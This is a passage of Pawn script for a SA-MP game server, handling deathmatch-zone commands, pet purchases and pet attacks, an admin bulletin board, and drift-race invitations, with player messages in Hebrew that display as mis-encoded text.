		SetPlayerVirtualWorld(playerid,world_dm_mm);
		playerinfo[playerid][dmzone] = dmz_mm;
		ResetWeapons(playerid);
		GiveWeapon(playerid,38,100000);
		if(IsPlayerInAnyVehicle(GetPlayerVehicleID(playerid))) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		new rnd = random(sizeof(DMZ_RandomSpawns_MMnS));
		SetPlayerPos(playerid,DMZ_RandomSpawns_MMnS[rnd][0],DMZ_RandomSpawns_MMnS[rnd][1],DMZ_RandomSpawns_MMnS[rnd][2]);
		SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_MMnS[rnd][3]);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		#if usingYSF
			//SetPlayerGravity(playerid,0.001000);
		#endif
		SendClientMessage(playerid,green," !Minigun Madness áøåê äáà ìàéæåø äãé-àí");
		SendClientMessage(playerid,green," .áàéæåø ãé-àí æä, ëì 10 äøéâåú ùååú ìàçú");
		SendClientMessage(playerid,green," /qdmz - òì îðú ìöàú îäàéæåø, øùåí àú äô÷åãä");
		return 1;
	}
	if(equal(cmd,"/ww"))
	{
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áàéæåø ãé-àí ëìùäå");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäöèøó ìàéæåø ãé-àí ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		SetPlayerVirtualWorld(playerid,world_dm_ww);
		playerinfo[playerid][dmzone] = dmz_ww;
		ResetWeapons(playerid);
		GiveWeapon(playerid,22,100000);
		SetPlayerSkillLevel(playerid,0,200);
		if(IsPlayerInAnyVehicle(GetPlayerVehicleID(playerid))) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		new rnd = random(sizeof(DMZ_RandomSpawns_WW));
		SetPlayerPos(playerid,DMZ_RandomSpawns_WW[rnd][0],DMZ_RandomSpawns_WW[rnd][1],DMZ_RandomSpawns_WW[rnd][2]);
		SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_WW[rnd][3]);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SendClientMessage(playerid,green," !The Wild West áøåê äáà ìàéæåø äãé-àí");
		SendClientMessage(playerid,green," /qdmz - òì îðú ìöàú îäàéæåø, øùåí àú äô÷åãä");
		return 1;
	}
	if(equal(cmd,"/uj"))
	{
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áàéæåø ãé-àí ëìùäå");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäöèøó ìàéæåø ãé-àí ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		SetPlayerVirtualWorld(playerid,world_dm_jetp);
		playerinfo[playerid][dmzone] = dmz_jetp;
		ResetWeapons(playerid);
		if(IsPlayerInAnyVehicle(GetPlayerVehicleID(playerid))) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		new rnd = random(sizeof(DMZ_RandomSpawns_Jetp));
		SetPlayerPos(playerid,DMZ_RandomSpawns_Jetp[rnd][0],DMZ_RandomSpawns_Jetp[rnd][1],DMZ_RandomSpawns_Jetp[rnd][2]);
		SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_Jetp[rnd][3]);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,world_dm_jetp);
		GiveJetpack(playerid);
		GiveWeapon(playerid,!random(2)? (!random(2)? 28:32):22,100000);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		#if usingYSF
			//SetPlayerGravity(playerid,0.008000);
		#endif
		SendClientMessage(playerid,green," !Uzi n Jetpack áøåê äáà ìàéæåø äãé-àí");
		SendClientMessage(playerid,green," /qdmz - òì îðú ìöàú îäàéæåø, øùåí àú äô÷åãä");
		return 1;
	}
	if(equal(cmd,"/matrix"))
	{
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áàéæåø ãé-àí ëìùäå");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäöèøó ìàéæåø ãé-àí ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		SetPlayerVirtualWorld(playerid,world_dm_matrix);
		playerinfo[playerid][dmzone] = dmz_matrix;
		ResetWeapons(playerid);
		if(IsPlayerInAnyVehicle(GetPlayerVehicleID(playerid))) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		new rnd = random(sizeof(DMZ_RandomSpawns_Matrix));
		SetPlayerPos(playerid,DMZ_RandomSpawns_Matrix[rnd][0],DMZ_RandomSpawns_Matrix[rnd][1],DMZ_RandomSpawns_Matrix[rnd][2]);
		SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_Matrix[rnd][3]);
		SetPlayerInterior(playerid,15);
		SetPlayerVirtualWorld(playerid,world_dm_matrix);
		GiveWeapon(playerid,!random(2) ? 24 : 23,100000);
		SetCameraBehindPlayer(playerid);
		#if usingYSF
			//SetPlayerGravity(playerid,0.003000);
		#endif
		SendClientMessage(playerid,green," !Matrix áøåê äáà ìàéæåø äãé-àí");
		SendClientMessage(playerid,green," /qdmz - òì îðú ìöàú îäàéæåø, øùåí àú äô÷åãä");
		return 1;
	}
	if(equal(cmd,"/rcwar"))
	{
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áàéæåø ãé-àí ëìùäå");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäöèøó ìàéæåø ãé-àí ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		playerinfo[playerid][dmzone] = dmz_rc;
		ResetWeapons(playerid);
		if(IsPlayerInAnyVehicle(GetPlayerVehicleID(playerid))) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		new rnd = random(sizeof(DMZ_RandomSpawns_RCWar));
		SetPlayerPos(playerid,DMZ_RandomSpawns_RCWar[rnd][0],DMZ_RandomSpawns_RCWar[rnd][1],DMZ_RandomSpawns_RCWar[rnd][2]);
		SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_RCWar[rnd][3]);
		SetPlayerInterior(playerid,10);
		SetPlayerVirtualWorld(playerid,world_dm_rc);
		GiveWeapon(playerid,31,100000);
		SetCameraBehindPlayer(playerid);
		#if usingYSF
			//SetPlayerGravity(playerid,0.003000);
		#endif
		SendClientMessage(playerid,green," !RC War áøåê äáà ìàéæåø äãé-àí");
		SendClientMessage(playerid,green," /qdmz - òì îðú ìöàú îäàéæåø, øùåí àú äô÷åãä");
		return 1;
	}
	if(equal(cmd,"/heavy"))
	{
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áàéæåø ãé-àí ëìùäå");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäöèøó ìàéæåø ãé-àí ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìàéæåø ãé-àí ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		SetPlayerVirtualWorld(playerid,world_dm_heavy);
		playerinfo[playerid][dmzone] = dmz_heavy;
		ResetWeapons(playerid);
		if(IsPlayerInAnyVehicle(GetPlayerVehicleID(playerid))) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		new rnd = random(sizeof(DMZ_RandomSpawns_RCWar));
		SetPlayerPos(playerid,DMZ_RandomSpawns_RCWar[rnd][0],DMZ_RandomSpawns_RCWar[rnd][1],DMZ_RandomSpawns_RCWar[rnd][2]);
		SetPlayerFacingAngle(playerid,DMZ_RandomSpawns_RCWar[rnd][3]);
		SetPlayerInterior(playerid,10);
		GiveWeapon(playerid,24,100000);
		GiveWeapon(playerid,!random(2) ? 27 : 25,100000);
		GiveWeapon(playerid,!random(2) ? 30 : 31,100000);
		GiveWeapon(playerid,!random(2) ? 33 : 34,100000);
		if(!random(5)) GiveWeapon(playerid,!random(2) ? 35 : 16,100000);
		SetCameraBehindPlayer(playerid);
		#if usingYSF
			//SetPlayerGravity(playerid,0.003000);
		#endif
		SendClientMessage(playerid,green," !Heavy Weapons áøåê äáà ìàéæåø äãé-àí");
		SendClientMessage(playerid,green," /qdmz - òì îðú ìöàú îäàéæåø, øùåí àú äô÷åãä");
		return 1;
	}
	if(equal(cmd,"/quitdmz") || equal(cmd,"/qdmz"))
	{
		if(playerinfo[playerid][dmzone] == dmz_none) return SendClientMessage(playerid,red," .àúä ìà ðîöà áàéæåø ãé-àí");
		ResetPlayerWeapons(playerid);
    	playerinfo[playerid][dmzone] = dmz_none;
    	SpawnPlayer(playerid);
		#if usingYSF
			//SetPlayerGravity(playerid,0.008000);
		#endif
		SetPlayerSkillLevel(playerid,0,999);
		SendClientMessage(playerid,green," .éöàú îàéæåø äãé-àí");
		return 1;
	}
	if(equal(cmd,"/buypet"))
	{
		if(playerinfo[playerid][level] < 2) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 2");
		if(playerinfo[playerid][pet][0] != pet_none) return SendClientMessage(playerid,red," .ëáø éù ìê çéä");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /buypet [pet number] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /pets :îñôøé çéåú");
			return 1;
		}
		switch(strval(cmd))
		{
			case 1:
			{
				if(playerinfo[playerid][level] < 2) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 2");
				if(GetMoney(playerid) < 60000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
				playerinfo[playerid][pet][0] = pet_fish;
				GiveMoney(playerid,0-60000);
				SendClientMessage(playerid,green," !÷ðéú çéä - ãâ");
			}
			case 2:
			{
				if(playerinfo[playerid][level] < 3) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 3");
				if(GetMoney(playerid) < 120000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
				playerinfo[playerid][pet][0] = pet_jelly;
				GiveMoney(playerid,0-120000);
				SendClientMessage(playerid,green," !÷ðéú çéä - îãåæä");
			}
			case 3:
			{
				if(playerinfo[playerid][level] < 4) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 4");
				if(GetMoney(playerid) < 140000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
				playerinfo[playerid][pet][0] = pet_rjelly;
				GiveMoney(playerid,0-140000);
				SendClientMessage(playerid,green," !÷ðéú çéä - îãåæåä àãåîä");
			}
			case 4:
			{
				if(playerinfo[playerid][level] < 6) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 6");
				if(GetMoney(playerid) < 250000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
				playerinfo[playerid][pet][0] = pet_turtle;
				GiveMoney(playerid,0-250000);
				SendClientMessage(playerid,green," !÷ðéú çéä - öá");
			}
			case 5:
			{
				if(playerinfo[playerid][level] < 8) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 8");
				if(GetMoney(playerid) < 120000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
				playerinfo[playerid][pet][0] = pet_dolphin;
				GiveMoney(playerid,0-350000);
				SendClientMessage(playerid,green," !÷ðéú çéä - ãåìôéï");
			}
			case 6:
			{
				if(playerinfo[playerid][level] < 12) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 12");
				if(GetMoney(playerid) < 200000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
				playerinfo[playerid][pet][0] = pet_shark;
				GiveMoney(playerid,0-500000);
				SendClientMessage(playerid,green," !÷ðéú çéä - ëøéù");
			}
		}
		fsetint(fuser(playerid),"Pet",playerinfo[playerid][pet][0]);
		return 1;
	}
	if(equal(cmd,"/pets"))
	{
		if(playerinfo[playerid][level] < 2) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 2");
		SendClientMessage(playerid,lightblue," ~~~ :îñôøé çéåú ~~~");
		SendClientMessage(playerid,white," 1. Fish(2) - 60000$ | 2. Jellyfish(3) - 120000$");
		SendClientMessage(playerid,white," 3. Red Jellyfish(4) - 140000$ | 4. Turtle(6) - 250000$");
		SendClientMessage(playerid,white," 5. Dolphin(8) - 350000$ | 6. Shark(12) - 500000$");
		return 1;
	}
	if(equal(cmd,"/pet"))
	{
		if(playerinfo[playerid][level] < 2) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 2");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /pet [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /pet on - îåöéà àú äçéä ùìê");
			SendClientMessage(playerid,white," /pet off - îçáéà àú äçéä ùìê");
			SendClientMessage(playerid,white," /pet attack [id] - àåîø ìçéä ùìê ìú÷åó");
			SendClientMessage(playerid,white," /pet stop - îôñé÷ àú äú÷ôú äçéä ùìê");
			SendClientMessage(playerid,white," /pet remove - îçé÷ú äçéä ùìê");
			return 1;
		}
		if(equal(cmd,"on"))
		{
			if(playerinfo[playerid][pet][0] == pet_none) return SendClientMessage(playerid,red," .àéï ìê çéä");
			if(playerinfo[playerid][pet][2]) return SendClientMessage(playerid,red," .äçéä ùìê ëáø áçåõ");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäåöéà àú äçéä ëàùø àúä ááçéøú ãîåéåú");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäåöéà àú äçéä ëàùø àúä áîöá");
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ìà ðéúï ìäåöéà çéä áøëá");
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .ìà ðéúï ìäåöéà çéä áî÷åîê äðåëçé");
			new Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			playerinfo[playerid][pet][1] = CreateSObject(GetPetModel(playerinfo[playerid][pet][0]),p[0]+(playerinfo[playerid][pet][0] >= pet_turtle? 7.0:3.0),p[1],p[2],0.000000,0.000000,0.000000);
			playerinfo[playerid][pet][2] = 1;
			playerinfo[playerid][pet][3] = 0;
			AttachSObjectToPlayer(playerinfo[playerid][pet][1],playerid,playerinfo[playerid][pet][0] >= pet_turtle? 6.5:2.8,0.0,0.0,0.0,0.0,0.0);
		}
		else if(equal(cmd,"off"))
		{
			if(playerinfo[playerid][pet][0] == pet_none) return SendClientMessage(playerid,red," .àéï ìê çéä");
			if(!playerinfo[playerid][pet][2]) return SendClientMessage(playerid,red," .äçéä ùìê ìà áçåõ");
			DestroySObject(playerinfo[playerid][pet][1]);
			playerinfo[playerid][pet][2] = 0;
			if(playerinfo[playerid][pet][3]) KillTimer(playerinfo[playerid][pet][4]);
			playerinfo[playerid][pet][3] = 0;
		}
		else if(equal(cmd,"attack"))
		{
			if(playerinfo[playerid][pet][0] == pet_none) return SendClientMessage(playerid,red," .àéï ìê çéä");
			if(!playerinfo[playerid][pet][2]) return SendClientMessage(playerid,red," .äçéä ùìê ìà áçåõ");
			if(playerinfo[playerid][pet][3]) return SendClientMessage(playerid,red," .äçéä ùìê ëáø úå÷ôú");
			new id, Float:p[4];
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /pet attack [id/name] :öåøú äùéîåù");
			id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(id == playerid) return SendClientMessage(playerid,red," .äçéä ùìê ìà éëåìä ìú÷åó àåúê");
			GetPlayerPos(id,p[0],p[1],p[2]);
			if(!ObjectToPoint(GetPetRadius(playerinfo[playerid][pet][0]),playerinfo[playerid][pet][1],p[0],p[1],p[2])) return SendClientMessage(playerid,red," .ä÷åøáï øçå÷ îãé");
			if(GetPlayerVirtualWorld(id) != GetPlayerVirtualWorld(playerid)) return SendClientMessage(playerid,red," .äçéä ùìê ìà éëåìä ìú÷åó ùç÷ï ùìà áòåìîê");
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			GetPlayerFacingAngle(playerid,p[3]);
			playerinfo[playerid][pet][3] = 1;
			DestroySObject(playerinfo[playerid][pet][1]);
			playerinfo[playerid][pet][1] = CreateSObject(GetPetModel(playerinfo[playerid][pet][0]),p[0]+(playerinfo[playerid][pet][0] >= pet_turtle? 6.5:2.8),p[1],p[2],0.000000,0.000000,0.000000);
			playerinfo[playerid][pet][4] = SetTimerEx("PetAttacking",200,1,"dd",playerid,id);
		}
		else if(equal(cmd,"stop"))
		{
			if(playerinfo[playerid][pet][0] == pet_none) return SendClientMessage(playerid,red," .àéï ìê çéä");
			if(!playerinfo[playerid][pet][2]) return SendClientMessage(playerid,red," .äçéä ùìê ìà áçåõ");
			if(!playerinfo[playerid][pet][3]) return SendClientMessage(playerid,red," .äçéä ùìê ìà úå÷ôú");
			new Float:p[4];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			KillTimer(playerinfo[playerid][pet][4]);
			playerinfo[playerid][pet][3] = 0;
			AttachSObjectToPlayer(playerinfo[playerid][pet][1],playerid,playerinfo[playerid][pet][0] >= pet_turtle? 6.5:2.8,0.0,0.0,0.0,0.0,0.0);
		}
		else if(equal(cmd,"remove"))
		{
			if(playerinfo[playerid][pet][0] == pet_none) return SendClientMessage(playerid,red," .àéï ìê çéä");
			if(IsValidSObject(playerinfo[playerid][pet][1])) DestroySObject(playerinfo[playerid][pet][1]);
			playerinfo[playerid][pet][2] = 0;
			if(playerinfo[playerid][pet][3]) KillTimer(playerinfo[playerid][pet][4]);
			playerinfo[playerid][pet][3] = 0;
			playerinfo[playerid][pet][0] = pet_none;
			SendClientMessage(playerid,green," .îç÷ú àú äçéä ùìê");
		}
		else SendClientMessage(playerid,red," .àôùøåú çéä ùâåéä");
		return 1;
	}
	if(equal(cmd,"/bb"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /bb [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /bb show - öôééä áìåç äîåãòåú");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /bb remove [message number] - îçé÷ú îåãòä");
				SendClientMessage(playerid,white," /bb add [message number] [text] - äåñôú îåãòä");
			}
			return 1;
		}
		if(equal(cmd,"show"))
		{
			new string[M_S];
			if(!fexist(file_bb))
			{
				fcreate(file_bb);
				for(new i=1;i<4;i++)
				{
					format(string,sizeof(string),"Message%d",i);
					fsetstring(file_bb,string,"None");
				}
			}
			SendClientMessage(playerid,lightblue," :ìåç îåãòåú");
			SendClientMessage(playerid,yellow,webpage);
			for(new i=1;i<11;i++)
			{
				format(string,sizeof(string),"Message%d",i);
				if(fkeyexist(file_bb,string) && !equal(fgetstring(file_bb,string),"None"))
				{
					format(string,sizeof(string)," (%d) - %s",i,fgetstring(file_bb,string));
					SendClientMessage(playerid,yellow,string);
				}
			}
			if(wangv != -1)
			{
				format(string,sizeof(string)," !%s îåñê ååàðâ îçôù àú äøëá",GetVehicleName(GetVehicleModel(wangv)));
				SendClientMessage(playerid,yellow,string);
			}
		}
		else if(equal(cmd,"add"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			if(playerinfo[playerid][admin] < 15) return SendClientMessage(playerid,red," .áëãé ìáöò ô÷åãä æå òìéê ìäéåú ìôçåú áøîú àãîéï 15");
			new string[M_S], number, text[256];
			cmd = strtok(cmdtext,idx), text = strrest(cmdtext,idx);
			if(!strlen(cmd) || !strlen(text) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /bb add [message number] [text] :öåøú äùéîåù");
			number = strval(cmd);
			format(string,sizeof(string),"Message%d",number);
			if(!fkeyexist(file_bb,string)) return SendClientMessage(playerid,red," .îñôø äåãòä ùâåé");
			//if(strlen(text) < 10) return SendClientMessage(playerid,red," .òì ääåãòä ìäëéì îéðéîåí 10 úåéí");
			//if(chatlocked && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .äö'àè ðòåì ëøâò, àéðê éëåì ìäåñéó îåãòåú");
			/*if(playerinfo[playerid][mute][0] > 0) return SendClientMessage(playerid,red," .ìà ðéúï ìäåñéó îåãòä ëàùø àúä îåùú÷");
			if(GetMoney(playerid) < (strlen(text)*20)) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó ìäåãòä áàåøê äæä");
			GiveMoney(playerid,(0-strlen(text)*20));*/
			if(advertisement(text)) return SendClientMessage(playerid,red," .äîòøëú æéäúä ôøñåí åìëï äîåãòä ìà òìúä");
			fixchars(text);
			for(new s=0;s<words_count;s++)
			{
				new pos;
				while((pos = strfind(text,words[s],true)) != -1) for(new i=pos, j=pos+strlen(words[s]);i<j;i++) text[i] = '*';
			}
			if(!fexist(file_bb))
			{
				fcreate(file_bb);
				for(new i=1;i<4;i++)
				{
					format(string,sizeof(string),"Message%d",i);
					fsetstring(file_bb,string,"None");
				}
			}
			format(string,sizeof(string),"Message%d",number);
			fsetstring(file_bb,string,text);
			SendClientMessage(playerid,green," :äåñôú îåãòä ììåç äîåãòåú");
			format(string,sizeof(string)," %s",text);
			SendClientMessage(playerid,green,string);
			/*format(string,sizeof(string)," .äîåãòä òìúä %d$",(strlen(text)*20));
			SendClientMessage(playerid,green,string);*/
		}
		else if(equal(cmd,"remove"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			if(playerinfo[playerid][admin] < 15) return SendClientMessage(playerid,red," .áëãé ìáöò ô÷åãä æå òìéê ìäéåú ìôçåú áøîú àãîéï 15");
			new string[M_S], number;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /bb remove [message number] :öåøú äùéîåù");
			number = strval(cmd);
			format(string,sizeof(string),"Message%d",number);
			if(!fkeyexist(file_bb,string)) return SendClientMessage(playerid,red," .îñôø äåãòä ùâåé");
			if(!fexist(file_bb))
			{
				fcreate(file_bb);
				for(new i=1;i<4;i++)
				{
					format(string,sizeof(string),"Message%d",i);
					fsetstring(file_bb,string,"None");
				}
			}
			format(string,sizeof(string),"Message%d",number);
			fsetstring(file_bb,string,"None");
			format(string,sizeof(string)," .îç÷ú àú äåãòä îñôø %d",number);
			SendClientMessage(playerid,green,string);
		}
		else SendClientMessage(playerid,red," .àôùøåú ìåç îåãòåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/drift"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /drift [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /drift invite [id/name] [place] [bet] - äæîðä ìãøéôè");
			SendClientMessage(playerid,white," /drift accept - àéùåø äæîðä ìãøéôè");
			SendClientMessage(playerid,white," /drift cancel - áéèåì äæîðä ìãøéôè");
			SendClientMessage(playerid,white," /drift quit - ìöàú îäãøéôè äðåëçé ùìê");
			return 1;
		}
		if(equal(cmd,"invite"))
		{
			new id, bet2, place, string[M_S];
			if(playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .àúä ëáø áãøéôè");
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /drift invite [id/name] [place] [bet] :öåøú äùéîåù");
			id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(id == playerid) return SendClientMessage(playerid,red," .àéðê éëåì ìäæîéï àú òöîê");
			cmd = strtok(cmdtext,idx), place = !strlen(cmd) || !IsNumeric(cmd)? 1:strval(cmd), cmd = strtok(cmdtext,idx), bet2 = !strlen(cmd) || !IsNumeric(cmd)? 0:strval(cmd);
			if(place < 1 || place > 3) return SendClientMessage(playerid,red," .îñôø î÷åí ùâåé");
			if(bet2 < 0 || bet2 > GetMoney(playerid)) return SendClientMessage(playerid,red," .ñëåí äéîåø ùâåé");
			if(playerinfo[id][indrift]) return SendClientMessage(playerid,red," .äùç÷ï ùøöéú ìäæîéï ëáø áãøéôè");
			format(string,sizeof(string)," .äæîéï àåúê ìãøéôè òì %d$ áæéøä îñôø %d %s",place,bet2,GetName(playerid));
			SendClientMessage(id,green,string);
			SendClientMessage(id,yellow," /drifthelp :ìòæøä òí îòøëú äãøéôèéí");
			format(string,sizeof(string)," .ìãøéôè òì %d$ áæéøä îñôø %d %s äæîðú àú",place,bet2,GetName(id));
			SendClientMessage(playerid,green,string);
			playerinfo[id][dinvited] = playerid, playerinfo[playerid][dinvited] = id, playerinfo[playerid][bet] = bet2, playerinfo[playerid][dinviter] = 1, playerinfo[playerid][dplace] = place;
		}
		else if(equal(cmd,"accept"))
		{
			new string[M_S];
			if(playerinfo[playerid][dmzone] != dmz_none ||
			playerinfo[playerid][indrift] ||
			playerinfo[playerid][inbattle] ||
			playerinfo[playerid][inact] ||
			playerinfo[playerid][reqclass] ||
			playerinfo[playerid][die]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå áîöáê äðåëçé");
			if(playerinfo[playerid][dinvited] == -1 || playerinfo[playerid][dinviter]) return SendClientMessage(playerid,red," .ìà äåæîðú ìãøéôè");
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .òìéê ìäéåú ðäâ áøëá");
			new world = GetEmptyWorld();
			if(world == -1) return SendClientMessage(playerid,red," .ìà äéä ðéúï ìäëðéñ àåúê ìãøéôè");
			SendClientMessage(playerid,green," .àéùøú àú ääæîðä ìãøéôè");
			format(string,sizeof(string)," .àéùø àú ääæîðä ìãøéôè %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][dinvited],green,string);
			GiveMoney(playerinfo[playerid][dinvited],0-playerinfo[playerinfo[playerid][dinvited]][bet]);
			playerinfo[playerid][indrift] = 1, playerinfo[playerinfo[playerid][dinvited]][indrift] = 1,
			playerinfo[playerid][driftcp] = 2, playerinfo[playerinfo[playerid][dinvited]][driftcp] = 2,
			playerinfo[playerid][bet] = playerinfo[playerinfo[playerid][dinvited]][bet],
			playerinfo[playerid][dplace] = playerinfo[playerinfo[playerid][dinvited]][dplace];
			playerinfo[playerid][dcd][0] = 5, playerinfo[playerinfo[playerid][dinvited]][dcd][0] = 5;
			playerinfo[playerid][dcd][1] = SetTimerEx("DriftCD",1000,1,"ii",playerid,playerinfo[playerid][dinvited]);
			switch(playerinfo[playerid][dplace])
			{
				case 1:
				{
					SetVehiclePos(GetPlayerVehicleID(playerinfo[playerid][dinvited]),DriftPositions_1[0][0],DriftPositions_1[0][1],DriftPositions_1[0][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerinfo[playerid][dinvited]),DriftPositions_1[0][3]);
